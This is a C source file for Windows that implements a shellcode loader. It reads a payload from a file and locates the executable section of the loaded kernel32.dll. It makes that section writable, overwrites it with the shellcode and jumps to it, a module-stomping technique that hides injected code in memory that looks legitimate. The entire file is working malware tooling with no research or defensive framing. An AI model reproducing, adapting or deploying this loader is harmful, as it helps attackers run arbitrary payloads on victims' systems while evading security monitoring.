#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment(lib, "kernel32.lib")

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <shellcode_file>\n", argv[0]);
        return 1;
    }

    // Read shellcode from file
    FILE *fp = fopen(argv[1], "rb");
    if (!fp) {
        printf("Error opening file: %s\n", argv[1]);
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
    if (!shellcode) {
        printf("Error allocating memory for shellcode\n");
        fclose(fp);
        return 1;
    }

    fread(shellcode, 1, shellcode_size, fp);
    fclose(fp);

    // Load a legitimate DLL (e.g., kernel32.dll)
    HMODULE hModule = LoadLibraryA("kernel32.dll");
    if (!hModule) {
        printf("Error loading kernel32.dll\n");
        free(shellcode);
        return 1;
    }

    // Get the address of a function within the DLL (e.g., GetProcAddress)
    // This will serve as a starting point to find an executable section.
    FARPROC pFunc = GetProcAddress(hModule, "GetProcAddress");
    if (!pFunc) {
        printf("Error getting address of GetProcAddress\n");
        free(shellcode);
        FreeLibrary(hModule);
        return 1;
    }

    // Calculate the base address of the module
    LPVOID moduleBase = (LPVOID)((DWORD_PTR)hModule);

    // Get the DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

    // Get the NT headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);

    // Get the address of the first section header
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    // Iterate through the sections to find an executable section
    LPVOID exec_mem = NULL;
    SIZE_T exec_size = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            // Found an executable section
            exec_mem = (LPVOID)((BYTE*)moduleBase + sectionHeader[i].VirtualAddress);
            exec_size = sectionHeader[i].SizeOfRawData;
            break;
        }
    }

    if (!exec_mem) {
        printf("Error finding executable section in kernel32.dll\n");
        free(shellcode);
        FreeLibrary(hModule);
        return 1;
    }

    if (shellcode_size > exec_size) {
        printf("Shellcode too large to fit in the executable section.\n");
        free(shellcode);
        FreeLibrary(hModule);
        return 1;
    }

    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, shellcode_size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("VirtualProtect failed: %d\n", GetLastError());
        free(shellcode);
        FreeLibrary(hModule);
        return 1;
    }

    // Copy shellcode to the executable section
    memcpy(exec_mem, shellcode, shellcode_size);

    // Restore the original protection
     if (!VirtualProtect(exec_mem, shellcode_size, oldProtect, &oldProtect)) {
        printf("VirtualProtect failed to restore original protection: %d\n", GetLastError());
        free(shellcode);
        FreeLibrary(hModule);
        return 1;
    }

    // Free the shellcode buffer
    free(shellcode);

    // Execute the shellcode
    ((void (*)())exec_mem)();

    //FreeLibrary(hModule); //Do not free library, could crash.

    return 0;
}